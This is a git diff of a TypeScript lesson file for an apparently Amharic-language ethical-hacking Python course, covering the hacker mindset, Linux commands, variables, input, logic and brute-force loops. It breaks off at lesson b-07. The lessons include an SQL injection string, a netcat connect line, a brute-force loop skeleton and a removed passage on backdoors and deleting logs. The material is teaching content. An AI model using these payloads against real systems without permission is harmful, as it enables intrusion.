@@ -2,258 +2,175 @@
 import { Lesson, SyllabusItem, Language, QuizQuestion } from "../types";
 
 // =====================================================================
-//  MASTER COURSE DATABASE (RE-ENGINEERED FOR DEPTH)
-//  Content Strategy: Deep Theory -> Practical Code -> Hacker Context
+//  CIPHER ACADEMY: MASTER DATABASE (ULTIMATE EDITION)
+//  Curriculum designed for EXTREME DEPTH.
 // =====================================================================
 
 // --- HELPERS ---
-const createPlaceholder = (id: string, cat: string, title: string, level: any, desc: string = "Advanced topic."): Lesson => ({
-    id, category: cat, title, level, description: desc,
-    content: `# ${title}\n\n## 🚧 Advanced Module Locked\n\nይህ ክፍል የሚከፈተው የቀድሞዎቹን ትምህርቶች በብቃት ሲያጠናቅቁ ነው። የ Cipher Academy ስርዓት የእርስዎን ብቃት እየተከታተለ ነው።\n\n### Upcoming Content:\n* Advanced Red Teaming\n* Custom Exploit Development\n* Binary Reverse Engineering\n* Zero-Day Research`,
-    starterCode: "# Access Denied\nprint('System: Complete previous modules first.')",
-    quiz: []
+const createLesson = (
+  id: string, 
+  category: string, 
+  title: string, 
+  level: 'Beginner' | 'Intermediate' | 'Advanced', 
+  desc: string,
+  content: string,
+  code: string,
+  quiz: QuizQuestion[]
+): Lesson => ({
+    id, category, title, level, description: desc, content, starterCode: code, quiz
 });
 
 // =====================================================================
-// 1. BEGINNER TRACK (ZERO TO HERO) - DEEP DIVE EDITION
+// 1. PYTHON HACKING TRACK (ZERO TO HERO)
 // =====================================================================
+
 const PYTHON_BEGINNER_LESSONS: Lesson[] = [
-  // --- MODULE 1: THE FOUNDATION (The Philosophy) ---
-  {
-    id: "b-01",
-    category: "01. The Foundation",
-    title: "1.1 The Hacker's Mindset & Ethics",
-    description: "Hacking is not about tools. It's a philosophy.",
-    level: "Beginner",
-    content: `# The Hacker's Mindset (የሃከር አስተሳሰብ)
+  // --- MODULE 1: THE MINDSET & ENVIRONMENT ---
+  createLesson(
+    "b-01", "01. Introduction", "1.1 The Hacker's Philosophy", "Beginner", "Understanding the art of exploitation.",
+    `# The Hacker's Mindset (የሃከር አስተሳሰብ)
 
-Hacking ማለት የኮምፒውተር ስክሪን ላይ አረንጓዴ ጽሁፍ እያዘነቡ "Access Granted" የሚል ድምጽ መስማት አይደለም። Hacking ማለት **"የማወቅ ጉጉት" (Curiosity)**፣ **"ፅናት" (Persistence)** እና **"ከሳጥን ውጪ ማሰብ" (Out of the box thinking)** ነው።
+Hacking ኮምፒውተርን መስበር ብቻ አይደለም። Hacking ማለት **"አንድ ነገር እንዴት እንደሚሰራ በዝርዝር ማወቅ እና ያንን እውቀት ተጠቅሞ ካልታሰበበት መንገድ ውጪ እንዲሰራ ማድረግ"** ነው።
 
-አንድ ፕሮግራም "A" ከተባለ "B"ን ይሰራል ተብሎ ከተሰራ፣ ሃከር "C" ብዬ ብጠይቀውስ? ብሎ ያስባል።
+### 1. The White Hat Way (የነጭ ኮፍያ መንገድ)
+በዚህ ኮርስ የምንማረው **Ethical Hacking (White Hat)** ነው።
+*   **Permission:** ሁልጊዜ ፍቃድ አለን።
+*   **Purpose:** ደህንነትን ለመጠበቅ እንጂ ለመጉዳት አይደለም።
+*   **Report:** ያገኘነውን ክፍተት ለባለቤቱ እናሳውቃለን።
 
-## 1. The 5 Phases of Hacking (የሃኪንግ 5 ደረጃዎች)
-ማንኛውም ፕሮፌሽናል ሃከር (Penetration Tester) የሚከተለውን ቅደም ተከተል ይከተላል፡
+### 2. The CIA Triad (የደህንነት መሰረት)
+ማንኛውም የሳይበር ደህንነት ባለሙያ የሚጠብቃቸው ሶስት ነገሮች፡
+1.  **Confidentiality (ሚስጥራዊነት):** መረጃው ስልጣን ላለው ሰው ብቻ መድረሱን ማረጋገጥ። (Example: Encryption)
+2.  **Integrity (ትክክለኛነት):** መረጃው በጉዞ ላይ ወይም ሲቀመጥ አለመቀየሩን ማረጋገጥ። (Example: Hashing)
+3.  **Availability (ተደራሽነት):** ሲስተሙ ሁልጊዜ መስራቱን ማረጋገጥ። (Example: Anti-DDoS)
 
-1.  **Reconnaissance (መረጃ ማሰባሰብ):** ስለ ኢላማው (Target) ምንም ሳይነኩ መረጃ መሰብሰብ። (IP Address, Email, Tech Stack).
-2.  **Scanning (መፈተሽ):** ኢላማው ላይ ክፍት በሮች (Ports) እና ድክመቶች (Vulnerabilities) መፈለግ። (Nmap, Nessus).
-3.  **Gaining Access (ሰርጎ መግባት):** በተገኘው ድክመት ተጠቅሞ ወደ ሲስተሙ መግባት። (Metasploit, Python Scripts).
-4.  **Maintaining Access (ቦታን ማመቻቸት):** ሲስተሙ ቢዘጋም ወይም ፓስዎርድ ቢቀየርም ተመልሶ መግቢያ መንገድ (Backdoor) ማበጀት።
-5.  **Clearing Tracks (ዱካን ማጥፋት):** እንደገባህ የሚያሳዩ መረጃዎችን (Logs) ማጥፋት።
+> **ህግ #1:** የራስህ ካልሆነ ወይም የጽሁፍ ፍቃድ ከሌለህ፣ የሰውን ሲስተም መንካት **ወንጀል** ነው። ይህን እውቀት ለመልካም ነገር ብቻ ተጠቀምበት።
 
----
-
-## 2. The CIA Triad (የደህንነት መሰረት)
-በ Ethical Hacking አለም ውስጥ፣ ማንኛውም የደህንነት ስራ እና ጥቃት በዚህ ሶስት ማዘን ላይ ይሽከረከራል፡
-
-*   **Confidentiality (ሚስጥራዊነት):** መረጃን ስልጣን ላለው ሰው ብቻ መፍቀድ። ይህ ሲሰበር **Data Leak** ይፈጠራል። (Example: የ Credit Card መረጃ መሰረቅ).
-*   **Integrity (ትክክለኛነት):** መረጃው በጉዞ ላይ ወይም ሲቀመጥ እንደማይቀየር፣ እንደማይሰረዝ እና እንደማይበላሽ ማረጋገጥ። (Example: አንድ ሃከር የባንክ ሂሳብን ከ $10 ወደ $1,000,000 ቢቀይር Integrity ተሰበረ).
-*   **Availability (ተደራሽነት):** መረጃው ወይም ሲስተሙ በሚፈለግበት ጊዜ መገኘቱን ማረጋገጥ። (Example: DoS Attack ሰርቨሩን ሲያጨናንቀው Availability ይጣሳል).
-
----
-
-## 3. ህግ እና ስነ-ምግባር (Ethics)
-"Ethical Hacker" የሚለውን ስም የያዝነው ለወግ አይደለም። ያለ ፍቃድ የሰውን ሲስተም መንካት **ወንጀል** ነው።
-
-*   **White Hat:** ፍቃድ ጠይቆ፣ ደህንነትን ለመጠበቅ የሚሰራ። (እኛ ነን)።
-*   **Black Hat:** ለግል ጥቅም፣ ለመጉዳት ወይም ለመስረቅ የሚሰራ ወንጀለኛ።
-*   **Grey Hat:** ያለ ፍቃድ የሚሰርግ ግን ለመጉዳት የማያስብ (ይህም ቢሆን ህገ-ወጥ ነው)።
-
-> **Rule #1:** የራስህ ካልሆነ ወይም የጽሁፍ ፍቃድ ከሌለህ **በፍፁም** አትንካ።
-
-\`\`\`python
-# የ Ethical Hacker መሃላ
-hacker_type = "White Hat"
-permission = True
-
-if hacker_type == "White Hat" and permission:
-    print("Authorized to Hack. Proceed with caution.")
-else:
-    print("STOP! This is illegal.")
-\`\`\`
+### 3. ለምን Python?
+ሃከሮች ለምን Pythonን ይወዳሉ?
+*   **Simple:** እንደ እንግሊዝኛ ይነበባል።
+*   **Powerful:** በመቶዎች የሚቆጠሩ የ Hacking Libraries አሉት (Scapy, Requests, Pwntools)።
+*   **Fast Dev:** በ C++ አንድ ቀን የሚፈጀውን በ Python በ 10 ደቂቃ መስራት ይቻላል።
 `,
-    starterCode: "print('I pledge to hack ethically.')",
-    quiz: [
-        { id: "q1", question: "ሃኪንግን ከወንጀል የሚለየው ዋናው ነገር ምንድነው?", options: [{id: "a", text: "የምንጠቀመው ኮምፒውተር"}, {id: "b", text: "የባለቤቱ ፍቃድ (Permission)"}, {id: "c", text: "የምንጽፈው ኮድ ፍጥነት"}], correctOptionId: "b", explanation: "ያለ ባለቤቱ ፍቃድ የሚደረግ ማንኛውም ሙከራ ወንጀል ነው።" },
-        { id: "q2", question: "አንድ ሃከር የባንክ ሂሳብ ቁጥሮችን ቀይሮ ቢገኝ፣ የትኛውን የ CIA Triad ክፍል ጣሰ?", options: [{id: "a", text: "Confidentiality"}, {id: "b", text: "Integrity"}, {id: "c", text: "Availability"}], correctOptionId: "b", explanation: "Integrity ማለት የመረጃን ትክክለኛነት መጠበቅ ነው። መረጃው ከተቀየረ Integrity ተጥሷል።" },
-        { id: "q3", question: "ከመግባት (Gaining Access) በፊት የሚቀድመው ደረጃ የቱ ነው?", options: [{id: "a", text: "Clearing Tracks"}, {id: "b", text: "Scanning"}, {id: "c", text: "Maintaining Access"}], correctOptionId: "b", explanation: "መጀመሪያ መረጃ ይሰበሰባል (Recon)፣ ቀጥሎ ይፈተሻል (Scanning)፣ ከዚያ ይገባል (Access)።" }
-    ]
-  },
-  {
-    id: "b-02",
-    category: "01. The Foundation",
-    title: "1.2 The Lab: Kali Linux & Terminal",
-    description: "Why hackers use Linux and how to survive in the terminal.",
-    level: "Beginner",
-    content: `# The Hacker's OS: Kali Linux
+    `print("I pledge to use my skills for good.")\nprint("Target: Secure the World.")`,
+    [{id:"q1", question:"የ CIA Triad አካል ያልሆነው የቱ ነው?", options:[{id:"a",text:"Confidentiality"},{id:"b",text:"Anonymity"},{id:"c",text:"Integrity"}], correctOptionId:"b", explanation:"Anonymity (መደበቅ) የ CIA Triad አካል አይደለም።"}]
+  ),
 
-ለምንድነው ሃከሮች ፊልም ላይ ሁሌም ጥቁር ስክሪን ላይ የሚጽፉት? ለምንድነው Windows የማይጠቀሙት?
+  createLesson(
+    "b-02", "01. Introduction", "1.2 Linux for Hackers", "Beginner", "Why we use Kali Linux.",
+    `# Linux: The Hacker's OS
 
-### 1. ሙሉ ቁጥጥር (Full Control)
-Windows እና macOS ተጠቃሚውን "ለመጠበቅ" ሲሉ ብዙ ነገሮችን ይደብቃሉ። Linux ግን የኮምፒውተሩን እያንዳንዱን ክፍል (Kernel, Network Stack, Memory) እንድታዝ ይፈቅድልሃል። ሃኪንግ ደግሞ ኮምፒውተሩን እሱ ከማያውቀው መንገድ ውጪ ማዘዝ ነው።
+Windows ለተራ ተጠቃሚ (Consumer) የተሰራ ነው። Linux ግን ለገንቢዎች እና ለሃከሮች (Builders & Breakers) የተሰራ ነው።
 
-### 2. Kali Linux ምንድነው?
-Kali Linux ለ **Penetration Testing** ተብሎ የተሰራ የ Linux ስሪት (Distro) ነው።
-*   ከ 600 በላይ የሃኪንግ መሳሪያዎች (Tools) ተጭነው ይመጣሉ።
-*   ለኔትወርክ ጥቃት የተመቻቸ Driver አለው።
-*   Open Source (ነጻ) ነው።
+### 1. The Terminal (ትዕዛዝ መስጫ)
+Hacking ፊልም ላይ እንደምታየው GUI (Graphical User Interface) የለውም። ሁሉም ነገር በ **Terminal** ነው የሚሰራው።
+*   ፈጣን ነው (Speed)።
+*   Script ማድረግ ይቻላል (Automation)።
+*   የኮምፒውተሩን "ነፍስ" (Kernel) ማዘዝ ይቻላል።
 
----
+### 2. Basic Commands (መሰረታዊ ትዕዛዞች)
+በ Python ውስጥ \`os\` ሞጁልን በመጠቀም የ Linux ትዕዛዞችን ማዘዝ እንችላለን።
 
-## The Terminal (ትዕዛዝ መስጫ)
-Terminal ማለት ከኮምፒውተሩ ጋር በቀጥታ የምናወራበት ቋንቋ ነው። Mouse መጠቀም ለተራ ተጠቃሚ ነው፤ ሃከር ኪቦርድ ብቻ ነው የሚጠቀመው።
-
-### መሰረታዊ ትዕዛዞች (Basic Commands):
-
-1.  **\`pwd\` (Print Working Directory):** አሁን የት ፎልደር ውስጥ እንዳለሁ ንገረኝ።
-    *   *Example Output:* \`/home/kali\`
-2.  **\`ls\` (List):** በዚህ ፎልደር ውስጥ ያሉ ፋይሎችን ዘርዝር።
-    *   \`ls -a\`: የተደበቁ ፋይሎችንም አሳይ (.hidden)።
-3.  **\`cd\` (Change Directory):** ወደ ሌላ ፎልደር ግባ።
-    *   \`cd Desktop\`: ወደ ዴስክቶፕ ግባ።
-    *   \`cd ..\`: አንድ ደረጃ ወደ ኋላ ተመለስ።
-4.  **\`cat\` (Concatenate):** የፋይልን ይዘት አንብብ።
-    *   \`cat password.txt\`
-5.  **\`sudo\` (SuperUser Do):** እንደ አስተዳዳሪ (Admin/Root) እዘዝ።
-    *   በሊኑክስ ውስጥ ለደህንነት ሲባል ማንኛውንም ከባድ ትዕዛዝ ስንሰጥ \`sudo\` ማስቀደም አለብን።
-
-### Python በ Kali ላይ
-Kali ላይ Python በነባሪ (Default) ተጭኖ ይመጣል። እኛ የምንጽፈው ስክሪፕት በሙሉ የሚሮጠው በዚህ ላይ ነው።
+*   \`pwd\`: አሁን የት ፎልደር ውስጥ ነኝ? (Print Working Directory)
+*   \`ls\`: እዚህ ውስጥ ምን ምን ፋይሎች አሉ? (List)
+*   \`cd\`: ወደ ሌላ ፎልደር ግባ። (Change Directory)
+*   \`cat\`: የፋይልን ይዘት አሳይ። (Concatenate)
+*   \`whoami\`: እኔ ማነኝ? (User privileges)
 
 \`\`\`python
 import os
 
-# Python ተጠቅመን የሊኑክስ ትዕዛዝ ማዘዝ እንችላለን
-print("Current Directory is:")
+print("[*] Current Directory:")
 os.system("pwd")
 
-print("\\nListing files:")
+print("\\n[*] Listing Files:")
 os.system("ls -la")
 \`\`\`
 `,
-    starterCode: "import os\n# በ Python ውስጥ የ Linux ትዕዛዝ እስኪ ላክ\nos.system('whoami')",
-    quiz: [
-        { id: "q1", question: "የተደበቁ ፋይሎችን (Hidden Files) ለማየት የሚጠቅመው ትዕዛዝ?", options: [{id: "a", text: "ls"}, {id: "b", text: "ls -a"}, {id: "c", text: "show all"}], correctOptionId: "b", explanation: "Linux ላይ በ (.) የሚጀምሩ ፋይሎች የተደበቁ ናቸው። እነሱን ለማየት -a (all) flag ያስፈልጋል።" },
-        { id: "q2", question: "አንድ ደረጃ ወደ ኋላ ለመመለስ (Back) የምንጠቀመው?", options: [{id: "a", text: "cd back"}, {id: "b", text: "cd .."}, {id: "c", text: "back"}], correctOptionId: "b", explanation: "cd .. (ሁለት ነጥብ) ወደ እናት ፎልደር ይመልሳል።" },
-        { id: "q3", question: "ሱፐር ዩዘር (Administrator) ሆኖ ለማዘዝ?", options: [{id: "a", text: "admin"}, {id: "b", text: "root"}, {id: "c", text: "sudo"}], correctOptionId: "c", explanation: "Sudo (Super User Do) ማለት እንደ አለቃ ሆነህ ፈጽም ማለት ነው።" }
-    ]
-  },
+    `import os\n# Let's see who we are running as\nos.system("whoami")\nos.system("ls")`,
+    [{id:"q1", question:"የፋይል ዝርዝር ለማየት የሚጠቅመው ትዕዛዝ?", options:[{id:"a",text:"cd"},{id:"b",text:"pwd"},{id:"c",text:"ls"}], correctOptionId:"c", explanation:"ls (List) ፋይሎችን ይዘረዝራል።"}]
+  ),
 
-  // --- MODULE 2: PYTHON CORE FOR HACKERS (The Weaponization) ---
-  {
-    id: "b-03",
-    category: "02. Python Core",
-    title: "2.1 Variables & Memory",
-    description: "Not just storing data. Understanding payloads.",
-    level: "Beginner",
-    content: `# Variables in a Hacker's Context
+  // --- MODULE 2: PYTHON CORE (WEAPONIZED) ---
+  createLesson(
+    "b-03", "02. Python Core", "2.1 Variables & Data Types", "Beginner", "Storing payloads and targets.",
+    `# Variables as Containers
 
-በተራ ፕሮግራሚንግ \`x = 10\` ይባላል። በ Hacking ግን Variable ማለት **Payload Container** ነው። የምንልከውን ቫይረስ፣ የምንሰርቀውን ፓስዎርድ፣ ወይም የምናጠቃውን IP የምናስቀምጥበት ሳጥን ነው።
+በ Hacking፣ Variable ማለት **Payload Container** ነው። የምንልከውን ቫይረስ፣ የምንሰርቀውን ፓስዎርድ፣ ወይም የምናጠቃውን IP የምናስቀምጥበት ሳጥን ነው።
 
-### 1. Data Types Matter
-Python "Dynamically Typed" ነው፣ ማለትም የዳታውን አይነት (Type) መናገር አይጠበቅብንም። ግን ለሃኪንግ ግዴታ ማወቅ አለብን።
-
-*   **String (str):** ጽሁፍ። ለ Payloads, URLs, Passwords.
-    *   \`target = "192.168.1.5"\`
-*   **Integer (int):** ቁጥር። ለ Ports, Threads, Buffer size.
-    *   \`port = 80\`
-*   **Boolean (bool):** ሁኔታ። Exploit ተሳክቷል?
-    *   \`is_root = False\`
-*   **Bytes (bytes):** ጥሬ ዳታ (Raw Data)። ለ Network Packets እና Encryption.
-    *   *ይህ በጣም ወሳኝ ነው።* ኔትወርክ ላይ የሚሄደው String ሳይሆን Bytes ነው።
-    *   \`payload = b"\\xde\\xad\\xbe\\xef"\` (ይህ Shellcode ሊሆን ይችላል)
-
-### 2. f-Strings (The Weapon of Choice)
-String መቀላቀል (Concatenation) ለሃከሮች ወሳኝ ነው። \`f-string\` በብዛት እንጠቀማለን።
-
+### 1. Strings (Text)
+ለ IP Address, Password, Username እና URL ይጠቅማል።
 \`\`\`python
-target_ip = "10.10.10.5"
-port = 4444
-payload = "A" * 100  # 100 'A's (Buffer Overflow test)
-
-# ቀጥታ ትዕዛዝ መፍጠር
-command = f"nc -nv {target_ip} {port}"
-print(f"[*] Attacking {target_ip} on port {port}")
-print(f"[*] Sending payload length: {len(payload)}")
+target_ip = "192.168.1.55"
+payload = "admin' OR '1'='1"  # SQL Injection Payload
 \`\`\`
 
-### 3. Type Conversion (Casting)
-አንዳንድ ጊዜ ቁጥርን ወደ ጽሁፍ፣ ጽሁፍን ወደ ቁጥር መቀየር ግዴታ ነው።
+### 2. Integers (Numbers)
+ለ Port Number, Thread count, እና Loop limit ይጠቅማል።
 \`\`\`python
 port = 80
-# print("Port is " + port) <--- ይህ Error ያመጣል!
+threads = 100
+\`\`\`
 
-# ትክክለኛው መንገድ
-print("Port is " + str(port))
+### 3. Bytes (Raw Data)
+ይህ በጣም ወሳኝ ነው። **Network Packet** የሚላከው በ Byte ነው። String አይደለም።
+\`\`\`python
+# 'b' ፊደል ከፊት ሲገባ Byte ይሆናል
+packet_header = b"\\xde\\xad\\xbe\\xef" 
+print(packet_header)
+\`\`\`
+
+### 4. String Concatenation (f-strings)
+የተለያዩ መረጃዎችን ቀላቅሎ አንድ Attack String መፍጠር።
+\`\`\`python
+ip = "10.0.0.1"
+port = 22
+print(f"Attacking {ip} on port {port}...")
 \`\`\`
 `,
-    starterCode: "ip = '127.0.0.1'\nport = 80\n# Create a string that says 'Connecting to 127.0.0.1:80'\nprint(f'Connecting to {ip}:{port}')",
-    quiz: [
-        { id: "q1", question: "ኔትወርክ ላይ መረጃ ለመላክ ምርጡ Data Type የቱ ነው?", options: [{id: "a", text: "String"}, {id: "b", text: "Bytes"}, {id: "c", text: "Integer"}], correctOptionId: "b", explanation: "ኮምፒውተሮች የሚያወሩት በ Bytes ነው። String ለሰው እንዲመች የተሰራ ነው። ለው ሲልከው .encode() ማድረግ አለብህ።" },
-        { id: "q2", question: "`payload = 'A' * 500` ምን ይሰራል?", options: [{id: "a", text: "Error ያመጣል"}, {id: "b", text: "500 'A' ፊደሎችን የያዘ String ይፈጥራል"}, {id: "c", text: "500 ጊዜ Aን print ያደርጋል"}], correctOptionId: "b", explanation: "Python ላይ ማባዛት (Multiply) ስትሪንግን ለመደጋግም ይጠቅማል። ይህ ለ Buffer Overflow ጥቃት ወሳኝ ነው።" }
-    ]
-  },
-  {
-    id: "b-04",
-    category: "02. Python Core",
-    title: "2.2 Inputs & interactive Tools",
-    description: "Building interactive hacking tools.",
-    level: "Beginner",
-    content: `# Making Tools Interactive
+    `target = "google.com"\nport = 443\nprint(f"Scanning {target}:{port}")`,
+    [{id:"q1", question:"ኔትወርክ ላይ ጥሬ መረጃ (Raw Data) ለመላክ የሚመረጠው Type?", options:[{id:"a",text:"String"},{id:"b",text:"Bytes"},{id:"c",text:"Float"}], correctOptionId:"b", explanation:"ኮምፒውተሮች የሚያወሩት በ Bytes ነው።"}]
+  ),
 
-ዝም ብሎ የሚሮጥ ስክሪፕት ሳይሆን፣ ተጠቃሚውን እየጠየቀ የሚሰራ "Tool" መስራት አለብን። ለዚህ \`input()\` እንጠቀማለን።
+  createLesson(
+    "b-04", "02. Python Core", "2.2 Input & Arguments", "Beginner", "Interactive tools vs CLI tools.",
+    `# Handling Input
 
-> **Hacker's Note:** ከ User የሚመጣ ማንኛውም መረጃ **አደገኛ** ነው (Untrusted Input)። ሁሌም ማጣራት (Validate) አለብን።
+አንድ Tool ዝም ብሎ መሮጥ የለበትም። ተጠቃሚውን "የትኛውን IP ላጥቃ?" ብሎ መጠየቅ አለበት።
 
-### 1. Basic Input
+### 1. \`input()\` Function
+ፕሮግራሙ ቆሞ ተጠቃሚው እስኪጽፍ ይጠብቃል።
 \`\`\`python
 target = input("Enter Target IP: ")
-print(f"Scanning {target}...")
+print(f"Target set to: {target}")
 \`\`\`
 
-### 2. Handling Numbers
-\`input()\` ሁሌም የሚመልሰው **String** ነው። ስለዚህ ወደ ቁጥር መቀየር አለብን።
+> **Security Note:** \`input()\` የሚቀበለው መረጃ ሁልጊዜ **String** ነው። ቁጥር ከፈለግን \`int()\` ብለን መቀየር አለብን።
 
-\`\`\`python
-# ፖርት ቁጥር ነው፣ ስለዚህ ወደ int መቀየር አለበት
-port_str = input("Enter Port (e.g. 80): ")
-port = int(port_str)
-
-if port < 1 or port > 65535:
-    print("Invalid Port Number!")
-else:
-    print(f"Port {port} set.")
-\`\`\`
-
-### 3. Command Line Arguments (sys.argv)
-ፕሮፌሽናል Tools (እንደ Nmap) ጥያቄ አይጠይቁም። መረጃውን ከትዕዛዙ ጋር ነው የምንሰጠው።
+### 2. \`sys.argv\` (Command Line Arguments)
+ፕሮፌሽናል Tools (እንደ Nmap, Metasploit) ብዙ ጊዜ ጥያቄ አይጠይቁም። መልሱን ከመጀመሪያው ትዕዛዝ ጋር አብረው ይሰጣሉ።
 Example: \`python3 exploit.py 192.168.1.1\`
 
 \`\`\`python
 import sys
 
 # sys.argv[0] የፋይሉ ስም ነው።
-# sys.argv[1] የመጀመሪያው መረጃ ነው።
+# sys.argv[1] የመጀመሪያው Argument ነው።
 
 if len(sys.argv) < 2:
     print("Usage: python3 exploit.py <IP_ADDRESS>")
 else:
-    target = sys.argv[1]
-    print(f"Target locked: {target}")
+    ip = sys.argv[1]
+    print(f"Attacking {ip}...")
 \`\`\`
 `,
-    starterCode: "import sys\n# Try printing sys.argv to see inputs\nprint(sys.argv)",
-    quiz: [
-        {id:"q1", question:"`input()` function ሁሌም ምን አይነት Data ይመልሳል?", options:[{id:"a",text:"Integer"},{id:"b",text:"String"},{id:"c",text:"Boolean"}], correctOptionId:"b", explanation:"ምንም እንኳን ቁጥር ብታስገባ፣ input() እንደ ጽሁፍ (String) ነው የሚቀበለው።"},
-        {id:"q2", question:"ከ Command Line ላይ መረጃ ለመቀበል የሚጠቅመው Library?", options:[{id:"a",text:"os"},{id:"b",text:"requests"},{id:"c",text:"sys"}], correctOptionId:"c", explanation:"sys.argv (Argument Vector) ኮማንድ ላይ የተጻፉትን ይቀበላል።"}
-    ]
-  },
-  {
-    id: "b-05",
-    category: "02. Python Core",
-    title: "2.3 Boolean Logic & Decision Making",
-    description: "Programming the brain of your exploit.",
-    level: "Beginner",
-    content: `# Logic: The Brain of the Exploit
+    `import sys\n# Try to simulate args (in real terminal: python script.py arg1)\nprint("Script Name:", sys.argv[0])`,
+    [{id:"q1", question:"ከ Command Line ላይ መረጃ ለመቀበል የሚጠቅመው?", options:[{id:"a",text:"input()"},{id:"b",text:"sys.argv"},{id:"c",text:"os.system"}], correctOptionId:"b", explanation:"sys.argv አርጉመንቶችን በ List መልክ ይይዛል።"}]
+  ),
+
+  createLesson(
+    "b-05", "02. Python Core", "2.3 Logic & Decision Making", "Beginner", "Building the brain of the exploit.",
+    `# Boolean Logic & If Statements
 
 የፃፍነው ስክሪፕት "ማሰብ" የሚችለው በ Logic ነው። "ይህ ከሆነ ይህን አድርግ" (If this, then that)።
 
@@ -273,72 +190,44 @@ else:
 
 \`\`\`python
 service = "FTP"
-version = 2.3
+version = 2.34
 is_open = True
 
 # VSFTPD v2.3.4 Backdoor ታሪክ ላይ ያለ በጣም ታዋቂ ክፍተት ነው።
 
-if service == "FTP":
-    if is_open:
-        if version == 2.34:
-            print("[!!!] VULNERABLE: VSFTPD v2.3.4 Backdoor Found!")
-            print("[*] Launching exploit...")
-        elif version < 2.34:
-            print("[*] Old version, might be vulnerable.")
-        else:
-            print("[-] Version seems patched.")
+if service == "FTP" and is_open:
+    if version == 2.34:
+        print("[!!!] VULNERABLE: VSFTPD v2.3.4 Backdoor Found!")
     else:
-        print("[-] Service is closed.")
+        print("[-] Version seems patched.")
 else:
     print("[-] Not an FTP service.")
 \`\`\`
-
-> **Pro Tip:** \`if\` statement ሲደራረብ (Nested) ኮዱን ለማንበብ ይከብዳል። \`and\` በመጠቀም ማሳጠር ይቻላል።
-
-\`\`\`python
-if service == "FTP" and is_open and version == 2.34:
-    print("[!!!] VULNERABLE!")
-\`\`\`
 `,
-    starterCode: "username = 'admin'\npassword = 'password123'\n\nif username == 'admin' and password == 'secret':\n    print('Access Granted')\nelse:\n    print('Access Denied')",
-    quiz: [
-        {id:"q1", question:"`if x == 5 and y == 10:` ይህ እውነት የሚሆነው መቼ ነው?", options:[{id:"a",text:"x=5 ሲሆን ብቻ"},{id:"b",text:"y=10 ሲሆን ብቻ"},{id:"c",text:"x=5 እና y=10 ሲሆኑ ብቻ"}], correctOptionId:"c", explanation:"AND ማለት ሁለቱም ግዴታ መሟላት አለባቸው ማለት ነው።"},
-        {id:"q2", question:"ተቃራኒውን (Inverse) ለመግለጽ የምንጠቀመው?", options:[{id:"a",text:"not"},{id:"b",text:"invert"},{id:"c",text:"reverse"}], correctOptionId:"a", explanation:"`if not connected:` ማለት ካልተገናኘ ማለት ነው።"}
-    ]
-  },
-  {
-    id: "b-06",
-    category: "02. Python Core",
-    title: "2.4 Loops: Brute Force Automation",
-    description: "Doing things 1,000,000 times without getting tired.",
-    level: "Beginner",
-    content: `# Loops: The Engine of Hacking Tools
+    `port = 22\nstate = "open"\nif port == 22 and state == "open":\n    print("SSH is accessible!")`,
+    [{id:"q1", question:"ሁለት ሁኔታዎች የግድ መሟላት ሲኖርባቸው ምን እንጠቀማለን?", options:[{id:"a",text:"or"},{id:"b",text:"and"},{id:"c",text:"not"}], correctOptionId:"b", explanation:"AND ማለት 'ይሄኛው እና ያኛው' ማለት ነው።"}]
+  ),
+
+  createLesson(
+    "b-06", "02. Python Core", "2.4 Loops: Automation", "Beginner", "Brute forcing and scanning.",
+    `# Loops: The Power of Automation
 
 ሃከር ማለት ሰነፍ ሰው ነው ብለናል። አንድን ፓስዎርድ ለመገመት 1000 ጊዜ በእጅ አይሞክርም። ስክሪፕት ጽፎ **Loop** ያደርጋል።
 
-### 1. For Loop (Iterating over lists)
+### 1. For Loop (Scanning Lists)
 የታወቀ ብዛት ያላቸውን ነገሮች ለመስራት። ለምሳሌ IP List ወይም Wordlist።
-
 \`\`\`python
-# Port Scanning Logic
-common_ports = [21, 22, 80, 443, 3306, 8080]
-
-print("[*] Starting Quick Scan...")
-
-for port in common_ports:
-    # እዚህ ጋር የመገናኘት ኮድ ይኖራል
-    print(f"Checking Port: {port}...")
-
-print("[*] Scan Complete.")
+ports = [21, 22, 80, 443]
+for port in ports:
+    print(f"Scanning Port {port}...")
 \`\`\`
 
 ### 2. The \`range()\` Function
-ቁጥሮችን ለመፍጠር። ለምሳሌ ከ Port 1 እስከ 1024 መፈተሽ ብንፈልግ።
-
+ቁጥሮችን ለመፍጠር።
 \`\`\`python
-# 1 እስከ 100
-for i in range(1, 101):
-    pass # Do something
+# Scan ports 1 to 1024
+for port in range(1, 1025):
+    pass 
 \`\`\`
 
 ### 3. While Loop (Until condition met)
@@ -347,269 +236,158 @@ for i in range(1, 101):
 *   **Reverse Shell Listener:** ኮኔክሽን እስኪመጣ ጠብቅ።
 
 \`\`\`python
-import time
-
 password_found = False
-attempt = 0
-
 while not password_found:
-    attempt += 1
-    print(f"Attempt {attempt}: Cracking...")
-    
-    # Simulation: 5ኛው ሙከራ ላይ ተገኘ እንበል
-    if attempt == 5:
-        print("[+] Password Found: 'admin123'")
-        password_found = True # Loop stops here
-        
-    time.sleep(0.5) # ትንሽ እረፍት (To avoid crash)
+    # Try password...
+    if success:
+        password_found = True
 \`\`\`
 
-### 4. \`break\` and \`continue\`
-*   **\`break\`**: ሉፑን አቋርጠህ ውጣ። (ፓስዎርዱ ከተገኘ በኋላ መቀጠል ትርጉም የለውም)።
-*   **\`continue\`**: ይህንን ዝለልና ቀጣዩን ስራ። (አንድ ፖርት Error ካመጣ፣ ሙሉ ስካኑን አታቁም፣ ቀጣዩን ፖርት ሞክር)።
+### 4. Break & Continue
+*   **Break:** ሉፑን አቋርጠህ ውጣ። (ፓስዎርዱ ከተገኘ በኋላ መቀጠል ትርጉም የለውም)።
+*   **Continue:** ይህንን ዝለልና ቀጣዩን ስራ። (አንድ ፖርት Error ካመጣ ዝለለው)።
 `,
-    starterCode: "passwords = ['123456', 'password', 'admin', 'root']\n\nfor p in passwords:\n    if p == 'admin':\n        print('Found!')\n        break\n    print(f'Trying {p}...')",
-    quiz: [
-        {id: "q1", question: "ፓስዎርዱን ልክ እንዳገኘን ፍለጋውን ለማቆም ምን እንጠቀማለን?", options: [{id:"a", text:"stop"}, {id:"b", text:"exit"}, {id:"c", text:"break"}], correctOptionId: "c", explanation: "Break ወዲያውኑ ከ Loop ውስጥ ያስወጣል።"},
-        {id: "q2", question: "የIP ዝርዝር (List) ላይ አንድ በአንድ ለመስራት የቱ Loop ይመረጣል?", options: [{id:"a", text:"For Loop"}, {id:"b", text:"While Loop"}], correctOptionId: "a", explanation: "For Loop የተወሰነ ብዛት ላለው ዝርዝር ተመራጭ ነው።"}
-    ]
-  },
-  {
-    id: "b-07",
